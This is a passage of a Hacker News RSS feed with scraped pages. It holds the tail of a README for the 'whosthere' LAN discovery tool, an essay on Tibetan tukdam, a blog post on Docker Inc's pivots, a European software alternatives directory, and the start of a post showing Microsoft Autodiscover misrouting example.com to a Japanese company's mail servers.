          &lt;code&gt;j&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Down&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;g&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to top&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;G&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to bottom&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;y&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy IP of selected device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;enter&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show device details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+t&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle theme selector&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Stop application&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;ESC&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Clear search / Go back&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;p&lt;/code&gt; (details view)&lt;/cell&gt;
        &lt;cell&gt;Start port scan on device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;tab&lt;/code&gt; (modal view)&lt;/cell&gt;
        &lt;cell&gt;Switch button selection&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Variable&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Path to the configuration file, to be able to overwrite the default location.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_LOG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Set the log level (e.g., &lt;code&gt;debug&lt;/code&gt;, &lt;code&gt;info&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt;). Defaults to &lt;code&gt;info&lt;/code&gt;.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Whosthere can be configured via a YAML configuration file. By default, it looks for the configuration file in the following order:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Path specified in the &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;environment variable (if set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;$XDG_CONFIG_HOME/whosthere/config.yaml&lt;/code&gt;(if&lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.config/whosthere/config.yaml&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also written to the console output.&lt;/p&gt;
    &lt;p&gt;Example of the default configuration file:&lt;/p&gt;
    &lt;code&gt;# How often to run discovery scans
scan_interval: 20s

# Maximum duration for each scan
# If you set this too low some scanners or the sweeper might not complete in time
scan_duration: 10s

# Splash screen configuration
splash:
  enabled: true
  delay: 1s

# Theme configuration
theme:
  # Configure the theme to use for the TUI, complete list of available themes at:
  # https://github.com/ramonvermeulen/whosthere/tree/main/internal/ui/theme/theme.go
  # Set name to "custom" to use the custom colors below
  # For any color that is not configured it will take the default theme value as fallback
  name: default

  # Custom theme colors (uncomment and set name: custom to use)
  # primitive_background_color: "#000a1a"
  # contrast_background_color: "#001a33"
  # more_contrast_background_color: "#003366"
  # border_color: "#0088ff"
  # title_color: "#00ffff"
  # graphics_color: "#00ffaa"
  # primary_text_color: "#cceeff"
  # secondary_text_color: "#6699ff"
  # tertiary_text_color: "#ffaa00"
  # inverse_text_color: "#000a1a"
  # contrast_secondary_text_color: "#88ddff"

# Scanner configuration
scanners:
  mdns:
    enabled: true
  ssdp:
    enabled: true
  arp:
    enabled: true

# Port scanner configuration
port_scanner:
  timeout: 5s
  # List of TCP ports to scan on discovered devices
  tcp: [21, 22, 23, 25, 80, 110, 135, 139, 143, 389, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 9000, 9090, 9200, 9300, 10000, 27017]

# Uncomment the next line to configure a specific network interface - uses OS default if not set
# network_interface: lo0&lt;/code&gt;
    &lt;p&gt;When running Whosthere in daemon mode, it exposes an very simplistic HTTP API with the following endpoints:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Method&lt;/cell&gt;
        &lt;cell role="head"&gt;Endpoint&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/devices&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get list of all discovered devices&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/device/{ip}&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get details of a specific device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/health&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Health check&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Theme can be configured via the configuration file, or at runtime via the &lt;code&gt;CTRL+t&lt;/code&gt; key binding.
A complete list of available themes can be found here, feel free to open a PR to add your own theme!&lt;/p&gt;
    &lt;p&gt;Example of theme configuration:&lt;/p&gt;
    &lt;code&gt;theme:
  name: cyberpunk&lt;/code&gt;
    &lt;p&gt;When the &lt;code&gt;name&lt;/code&gt; is set to &lt;code&gt;custom&lt;/code&gt;, the other color options can be used to create your own custom theme.&lt;/p&gt;
    &lt;p&gt;Logs are written to the application's state directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;$XDG_STATE_HOME/whosthere/app.log&lt;/code&gt;(if&lt;code&gt;XDG_STATE_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.local/state/whosthere/app.log&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also output to the console.&lt;/p&gt;
    &lt;p&gt;For clipboard functionality to work:&lt;/p&gt;
    &lt;p&gt;Runtime requirements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux (X11): X11 client library (e.g., &lt;code&gt;libx11-6&lt;/code&gt;on Ubuntu,&lt;code&gt;libX11&lt;/code&gt;on Fedora/Arch, often pre-installed).&lt;/item&gt;
      &lt;item&gt;Linux (Wayland): Not natively supported. May require XWayland.&lt;/item&gt;
      &lt;item&gt;macOS/Windows: No dependencies.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Build requirements (when compiling from source):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux: X11 development package (&lt;code&gt;libx11-dev&lt;/code&gt;,&lt;code&gt;libX11-devel&lt;/code&gt;, or&lt;code&gt;libx11&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Whosthere is intended for use on networks where you have permission to perform network discovery and scanning, such as your own home network. Unauthorized scanning of networks may be illegal and unethical. Always obtain proper authorization before using this tool on any network.&lt;/p&gt;
    &lt;p&gt;Contributions and suggestions such as feature requests, bug reports, or improvements are welcome! Feel free to open issues or submit pull requests on the GitHub repository. Please make sure to discuss any major changes on a Github issue before implementing them.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731432</guid><pubDate>Fri, 23 Jan 2026 11:54:53 +0000</pubDate></item><item><title>Presence in Death</title><link>https://rubinmuseum.org/presence-in-death/</link><description>&lt;doc fingerprint="bf9c9a2f1fa79b9c"&gt;
  &lt;main&gt;
    &lt;p&gt;In what Tibetan Buddhists call tukdam (Wylie transliteration: thugs dam), experienced meditators die in meditative equipoise. Their bodies do not show the usual signs of death—such as smell, rigor mortis, or decomposition—for days or even weeks after their clinical deaths. They appear lifelike, and many even remain sitting upright in meditation posture. From the Tibetan Buddhist point of view, the meditators are resting in a subtle state of consciousness with an associated subtle material energy present in the body. They are still in the process of dying. Yet according to modern biomedical and legal definitions, they are dead. Many cases of tukdam have now been scientifically documented.&lt;/p&gt;
    &lt;p&gt;For my 2022 documentary film Tukdam: Between Worlds and research for my PhD in medical anthropology, I have been following the Tukdam Project, a groundbreaking scientific research initiative lead from the Center for Healthy Minds at the University of Wisconsin—Madison and headed by renowned neuroscientist Richard Davidson.* It has focused on documenting tukdam bodies and trying to understand why the decomposition process seems to be delayed. His Holiness the Dalai Lama initiated this multidisciplinary project, which has been carried out with Tibetan collaborators from Delek Hospital in Dharamshala and Men-Tsee-Khang (Tibetan Medical and Astro-Science Institute) traditional Tibetan medicine doctors in India. In recent years, Russian and Indian scientific collaborators have also joined the effort to understand tukdam scientifically.&lt;/p&gt;
    &lt;p&gt;In following the project, I have been struck by the differing expectations and even cross-purposes that the Tibetan and scientific parties seem to harbor. Tibetans hope the research may reveal something about a subtle nature of consciousness that continues beyond clinical and brain death, and which is held to be responsible for keeping the bodies fresh. The Dalai Lama also seems to be invested in this research because of its potential to reveal something about the nature of consciousness that transcends the brain-body complex and even this life.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;IN TUKDAM, CLINICALLY DEAD MEDITATORS ARE SAID TO DWELL IN THE LUMINOSITY OF EMPTINESS.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;While the non-decaying tukdam body signifies the presence of consciousness for Tibetans, this is not obvious from a biophysical scientific perspective. Indeed, the Center for Healthy Minds has been looking for possible residual activity in the brainstem—a primitive part of the brain not thought to be involved in consciousness—as a factor contributing to the unusual integration of the bodies. In 2021, the research team published a null-finding stating they had not found any activity in the brain so far. Compelled to operate within a biophysical paradigm, scientists are also interested in possible changes to cell metabolism and breakdown, brought about by years of meditation practice, as perhaps contributing to the pristine postmortem state of tukdam bodies. But taking samples from the bodies has so far been out of the question due to cultural sensitivity and the sacredness of these deaths. Tibetans are concerned that invasive procedures could disturb the postmortem meditative state and the potential it carries for spiritual liberation and achieving a good rebirth.&lt;/p&gt;
    &lt;p&gt;An exchange from Tukdam: Between Worlds illustrates some of the tensions and cross-purposes with which the scientists and Tibetan parties have been operating, although there have been developments in the research and collaboration since the time of shooting in 2019 to early 2020. The scene shows a meeting where Dr. Dylan Lott, who was then the Tukdam Project manager in India, presents the current state of the research and its findings to Tibetan project collaborators. The Dalai Lama’s personal physician, Dr. Tsetan Dorji Sadutshang, expresses frustration over the lack of results from years of research and what he sees as a misguided approach to explain tukdam in neuroscientific terms. According to the Tibetan view, something far more subtle than the “gross” mind related to the brain and senses is responsible for the physical signs of tukdam.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Dr. Tsetan:&lt;/p&gt;
      &lt;p&gt;To me, from my understanding of His Holiness’ hope from this project, really is to have some proof that there is some sort of consciousness . . . or a mind continuing, that goes on beyond this life, basically. The only first kindergarten step is really to say: Is there a difference between a gross mind and a subtle mind?&lt;/p&gt;
      &lt;p&gt;Dr. Lott:&lt;/p&gt;
      &lt;p&gt;We cannot prove rebirth. We cannot prove mind. We cannot prove subtle mind. What we can do is look at the effects of those practices on the body that are unusual and that Western science, or medical science, doesn’t have a good explanation for.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;As is the case with science, it is not obvious to all Buddhist traditions that a non-decomposing body proves the presence of consciousness. The medieval Chinese Chan tradition, for example, also records miraculously preserved meditators’ bodies. These did not, however, signify present consciousness, which according to widespread Buddhist doctrine, departs immediately at death to be reborn or to enter nirvana. Here the body is preserved due to purification by religious practice and virtue accumulated while alive.&lt;/p&gt;
    &lt;p&gt;There is something paradoxical in taking the non-decaying body as evidence for a consciousness that transcends the body and physicality. However, here we should be careful to note that in the Tibetan Buddhist tantric tradition different levels of mind are associated with different types of embodiment. Subtler forms of consciousness are associated with tantric subtle bodies or physiologies familiar to advanced tantric practitioners. As these are in a way two sides of the same coin, mind always affects body and vice versa. Such subtle bodies are arguably different from, though connected to, the “gross” biomedical body that scientists work with, which also shows effects of subtle levels of mind and embodiment.&lt;/p&gt;
    &lt;p&gt;Tibetan tradition exhibits a great deal of sophistication and specificity when it comes to signs or ways of ascertaining whether a person is in tukdam—as well as when it ends. The body will slump over if it was sitting upright; smell and normal signs of decomposition will appear. In accordance with subtle tantric physiology, red and white liquids may come out the nostrils and genitals. These are all signs that even the most subtle consciousness has departed. For Tibetans, final death occurs when the mind leaves the body, which could be weeks after clinical death in cases of tukdam,or hours to days for “normal” deaths.&lt;/p&gt;
    &lt;p&gt;There is also a tantalizing tradition of ending tukdam that could be seen as indicative of consciousness. If tukdam goes on too long, it may be ended by ringing a bell near the ear of the deceased practitioner, saying certain prayers, or asking them to end their meditation. The body then reportedly collapses and decomposition takes over. This could imply responsivity on the part of the deceased meditators, bearing on questions of consciousness. In an interview piece that did not make the final cut of my documentary, the Dalai Lama recounted this story:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;One lama I had a very close connection [with] . . . Last few years his physical [condition] was very, very weak. And then in my last meeting in Mongolia, I told him, “Now time has come. You have to think about your next life.” Then around the end of the year, with New Year soon, I received one message from him: “When I should die? Where I should die?” . . . Quite silly, “where I should die, when I should die!” Then accordingly I also answered a silly sort of answer, “You should die in Mongolia. The time, not end of the year but the beginning of the year, New Year.” He exactly, I think in the first week of the New Year, then he died. Then I sent my representative with my [ceremonial silk] scarf. I think it took two days . . . When my representative reached his place and put the scarf which I sent . . . on his neck, then he ended his tukdam. [Dalai Lama makes gesture of body slumping over.] So these are quite mysterious things. There are some elements to control. It is quite obvious as soon as the tukdam ends, the physical [body] clearly shows real death, the real corpse.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;People often report feeling a meditative calm or presence when entering the room of someone in tukdam. Some of the American scientists researching tukdam also said they felt it. But such things seem difficult to measure and to be firmly in the realm of first-person experience as opposed to the third-person observation of natural science. This does not, however, necessarily make such perceptions less real. As another Tukdam Project collaborator, senior Tibetan medicine doctor Tsewang Tamdin, told me, “Just because something is invisible does not mean it does not exist.”&lt;/p&gt;
    &lt;p&gt;As in life and death, the dynamic of presence and absence is central to tukdam. Here we come to a basic conflict between the Tibetan Buddhist and current biomedical views of death. For the latter, death unequivocally means absence. Once the heart shuts down, brain death quickly follows “unless it’s been inflicted before the heart stopped” and the person is gone. But for Tibetan Buddhists, there is presence, or mind, in death.&lt;/p&gt;
    &lt;p&gt;*Richard Davidson is a member of the Rubin Museum’s advisory board.&lt;/p&gt;
    &lt;p&gt;Donagh Coleman is a Finnish-Irish-American filmmaker. Previous award-winning documentaries with international festival and TV exposure include Stone Pastures and A Gesar Bard’s Tale. Donagh’s films have been shown by the European Commission and museums such as MoMA and the Rubin Museum. Donagh is currently doing a PhD in medical anthropology at University of California, Berkeley and holds degrees in philosophy and psychology and music and media technologies from Trinity College Dublin, as well as a master’s in Asian studies from University of California, Berkeley.&lt;/p&gt;
    &lt;p&gt;Get the latest news and stories from the Rubin, plus occasional information on how to support our work.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731612</guid><pubDate>Fri, 23 Jan 2026 12:16:54 +0000</pubDate></item><item><title>What has Docker become?</title><link>https://tuananh.net/2026/01/20/what-has-docker-become/</link><description>&lt;doc fingerprint="3d97b07b1d651558"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;What has Docker become?&lt;/head&gt;
    &lt;head rend="h5"&gt;Posted on January 20, 2026 • 4 minutes • 851 words&lt;/head&gt;
    &lt;p&gt;It’s weird to see Docker Inc (the company) struggle to find its place in 2026. What started as the company that revolutionized how we deploy applications has been through multiple identity crises, pivoting from one strategy to another in search of sustainable revenue and market relevance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Identity Crisis&lt;/head&gt;
    &lt;p&gt;Docker’s journey reads like a startup trying to find product-market fit, except Docker already had product-market fit - they created the containerization standard that everyone uses. The problem is that Docker the technology became so successful that Docker the company struggled to monetize it. When your core product becomes commoditized and open source, you need to find new ways to add value.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Swarm Exit&lt;/head&gt;
    &lt;p&gt;Docker Swarm was Docker’s attempt to compete with Kubernetes in the orchestration space. But Kubernetes won that battle decisively, and Docker eventually sold Swarm. This was a clear signal that Docker was stepping back from trying to be the full-stack container platform and instead focusing on what they could uniquely provide.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Developer Tools Pivot&lt;/head&gt;
    &lt;p&gt;For a while, Docker seemed to focus on developer experience. This made sense - developers are Docker’s core users, and improving their workflow could be a differentiator. Docker Scout emerged from the acquisition of Atomist in June 2022, bringing “software supply chain” capabilities. Scout allows Docker to see not just what’s in a container, but how it was built and where vulnerabilities are. This was a smart move toward security and observability, areas where Docker could add real value.&lt;/p&gt;
    &lt;p&gt;Docker also acquired AtomicJar, the company behind Testcontainers, adding shift-left testing capabilities. Testcontainers lets developers run real dependencies (databases, message queues, etc.) in containers during testing, making integration tests more reliable and closer to production environments.&lt;/p&gt;
    &lt;head rend="h2"&gt;The AI Pivot&lt;/head&gt;
    &lt;p&gt;Then came the AI pivot. Docker Model Runner entered the scene, positioning Docker as a platform for running AI models. Docker Compose expanded to support AI agents and models. Docker Offload was introduced for cloud-scale GPU execution of AI tasks. Partnerships with Google Cloud, Microsoft Azure, and AI SDKs (CrewAI, LangGraph, Vercel AI SDK) followed.&lt;/p&gt;
    &lt;p&gt;The acquisition of MCP Defender in September 2025 further cemented Docker’s move into AI security, focusing on securing agentic AI infrastructure and runtime threat detection. This was a significant shift - from developer tools to AI infrastructure.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Hardened Images Move&lt;/head&gt;
    &lt;p&gt;Suddenly, Docker moved into the hardened images space. In December 2025, Docker made over 1,000 Docker Hardened Images free and open source under Apache 2.0, reducing vulnerabilities by up to 95% compared to traditional images. This move was likely triggered by Chainguard’s success in the secure container image space. Chainguard had been building a business around minimal, secure container images, and Docker needed to respond.&lt;/p&gt;
    &lt;p&gt;Making hardened images free was a bold move - it’s hard to compete with free, especially when it’s open source. But it also raises questions about Docker’s business model. If you’re giving away your security features for free, what are you selling?&lt;/p&gt;
    &lt;head rend="h2"&gt;Leadership Changes and Acquisition Speculation&lt;/head&gt;
    &lt;p&gt;In February 2025, Docker replaced CEO Scott Johnston (who led the company since 2019) with Don Johnson, a former Oracle Cloud Infrastructure founder and executive vice president. This leadership transition has prompted tech analysts to anticipate a potential acquisition by a major cloud provider. The CEO swap, combined with the strategic pivots, suggests Docker may be positioning itself for sale rather than building a standalone business.&lt;/p&gt;
    &lt;head rend="h2"&gt;What This All Means&lt;/head&gt;
    &lt;p&gt;Docker’s strategic shifts tell a story of a company searching for its place in a market it helped create. The containerization technology Docker pioneered became so successful that it became infrastructure - something everyone uses but no one wants to pay for directly.&lt;/p&gt;
    &lt;p&gt;The pivots from orchestration (Swarm) to developer tools (Scout, Testcontainers) to AI (Model Runner, MCP Defender) to security (Hardened Images) show a company trying different approaches to find sustainable revenue. Each pivot makes sense in isolation, but together they paint a picture of a company without a clear long-term vision.&lt;/p&gt;
    &lt;p&gt;The hardened images move is particularly interesting because it’s defensive - responding to Chainguard’s success rather than leading with innovation. Making it free and open source is a strong competitive move, but it doesn’t solve the fundamental business model question.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Future&lt;/head&gt;
    &lt;p&gt;Docker the technology isn’t going anywhere. It’s too embedded in the infrastructure of modern software development. But Docker the company? That’s less clear. The leadership change, acquisition speculation, and rapid strategic pivots suggest Docker Inc may be positioning itself for an exit rather than building a long-term independent business.&lt;/p&gt;
    &lt;p&gt;For developers, this doesn’t change much. Docker containers will continue to work, and the open source nature of Docker means the technology will persist regardless of what happens to the company. But it’s worth watching how Docker Inc’s search for identity plays out - it could affect the ecosystem of tools and services built around containers.&lt;/p&gt;
    &lt;p&gt;The irony is that Docker created a standard so successful that it became infrastructure, and infrastructure is hard to monetize. Docker Inc’s struggle to find its place is a cautionary tale about the challenges of building a business around open source technology that becomes too successful.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731748</guid><pubDate>Fri, 23 Jan 2026 12:36:17 +0000</pubDate></item><item><title>European Alternatives</title><link>https://european-alternatives.eu</link><description>&lt;doc fingerprint="8c31fd39e929e0e6"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;European alternatives for digital products&lt;/head&gt;
    &lt;head rend="h2"&gt;We help you find European alternatives for digital service and products, like cloud services and SaaS products.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;
        &lt;p&gt;Support local businesses&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-1"&gt;When you buy from local businesses, you are supporting yourself down the road. Taxes paid by the company come back to you indirectly and the company creates jobs in your region.&lt;/item&gt;
      &lt;item rend="dt-2"&gt;
        &lt;p&gt;Data protection / GDPR&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-2"&gt;Some companies outside Europe tend to ignore data protection and related laws such as the GDPR or do not implement them correctly.&lt;/item&gt;
      &lt;item rend="dt-3"&gt;
        &lt;p&gt;VAT / Billing&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-3"&gt;As a business that operates in Europe, it is possible to get a VAT refund for products/services of other European companies. European companies also tend to offer payment methods that are commonly used in Europe.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;
        &lt;p&gt;Similar legal requirements&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-4"&gt;Within the EU, many laws and framework conditions are set by the EU, which helps to cover a large market without having to consider large country-specific differences. It is also easier to enforce your rights against another company located in the EU.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Categories&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Web analytics services&lt;/head&gt;&lt;p&gt;A web analytics service tracks user behavior on websites so that website owners can understand user usage and optimize their websites.&lt;/p&gt;31 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Cloud computing platforms&lt;/head&gt;&lt;p&gt;A cloud computing platform provides on-demand hosting services.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Content delivery network (CDN) services&lt;/head&gt;&lt;p&gt;A content delivery network (CDN) is a geographically distributed network.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Email providers&lt;/head&gt;&lt;p&gt;An email provider provides its users with an e-mail address and the corresponding mailboxes.&lt;/p&gt;20 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Virtual private server (VPS) hosters&lt;/head&gt;&lt;p&gt;A virtual private server (VPS) hoster provides virtual servers with predefined RAM, storage, traffic and virtual cores.&lt;/p&gt;23 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Search engines&lt;/head&gt;&lt;p&gt;A search engine allows their users to search the internet.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Transactional email service&lt;/head&gt;&lt;p&gt;A transactional mail service offers users the ability to send emails from their applications via the service.&lt;/p&gt;7 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Domain name registrars&lt;/head&gt;&lt;p&gt;Domain name registrars are companies that manages the reservation of Internet domain names.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Time tracking apps&lt;/head&gt;&lt;p&gt;A time tracking app is an application that helps users track how much time was spent on which task or project.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Navigation apps&lt;/head&gt;&lt;p&gt;Navigation apps help you get from A to B.&lt;/p&gt;8 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Uptime monitoring services&lt;/head&gt;&lt;p&gt;An uptime monitoring service periodically checks if a website or other service is active.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;File hosting services&lt;/head&gt;&lt;p&gt;With a file hosting service, users can upload files to back them up or share them with others.&lt;/p&gt;11 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Machine translation services&lt;/head&gt;&lt;p&gt;A machine translation service (translator) is a service that programmatically translates text from one language to another.&lt;/p&gt;5 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Object storage providers&lt;/head&gt;&lt;p&gt;Object storage providers allow their users to store files hierarchically.&lt;/p&gt;15 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Microblogging services&lt;/head&gt;&lt;p&gt;A microblogging service allows users to post short texts, images or links to videos.&lt;/p&gt;2 alternatives&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731976</guid><pubDate>Fri, 23 Jan 2026 13:01:51 +0000</pubDate></item><item><title>Microsoft mishandling example.com</title><link>https://tinyapps.org/blog/microsoft-mishandling-example-com.html</link><description>&lt;doc fingerprint="af11ed5a5a169e95"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Microsoft mishandling example.com&lt;/head&gt;
    &lt;p&gt;TL;DR: Since at least February 2020, Microsoft's Autodiscover service has incorrectly routed the IANA-reserved &lt;code&gt;example.com&lt;/code&gt; to Sumitomo Electric Industries' mail servers at sei.co.jp, potentially sending test credentials there.&lt;/p&gt;
    &lt;head rend="h2"&gt;Problem&lt;/head&gt;
    &lt;p&gt;While setting up &lt;code&gt;email@example.com&lt;/code&gt; as a dummy account in Outlook (on both Windows and macOS), Outlook consistently auto-configured it to use &lt;code&gt;imapgms.jnet.sei.co.jp&lt;/code&gt; (IMAP) and &lt;code&gt;smtpgms.jnet.sei.co.jp&lt;/code&gt; (SMTP) despite &lt;code&gt;example.com&lt;/code&gt; being an IANA-reserved domain that should not resolve to real services.&lt;/p&gt;
    &lt;p&gt;The same behavior appeared on different machines, profiles, networks, and DNS resolvers, including a newly provisioned Windows 365 Cloud PC:&lt;/p&gt;
    &lt;head rend="h2"&gt;Confirmation&lt;/head&gt;
    &lt;head rend="h3"&gt;DNS verification&lt;/head&gt;
    &lt;p&gt;Confirm that &lt;code&gt;example.com&lt;/code&gt; has no DNS records pointing to &lt;code&gt;sei.co.jp&lt;/code&gt;:&lt;/p&gt;
    &lt;quote&gt;%&lt;code&gt;dig MX example.com +short&lt;/code&gt;0 . %&lt;code&gt;dig CNAME autodiscover.example.com +short&lt;/code&gt;(no response) %&lt;code&gt;dig SRV _autodiscover._tcp.example.com +short&lt;/code&gt;(no response)&lt;/quote&gt;
    &lt;p&gt;The domain has a null MX record (indicating it doesn't accept email) and no Autodiscover DNS entries, confirming the misconfiguration exists entirely within Microsoft's database.&lt;/p&gt;
    &lt;head rend="h3"&gt;Microsoft autodiscover API response&lt;/head&gt;
    &lt;p&gt;Microsoft's Autodiscover service misconfiguration can be confirmed via &lt;code&gt;curl -v -u "email@example.com:password" "https://prod.autodetect.outlook.cloud.microsoft/autodetect/detect?app=outlookdesktopBasic"&lt;/code&gt;:&lt;/p&gt;
    &lt;head&gt;View full output&lt;/head&gt;
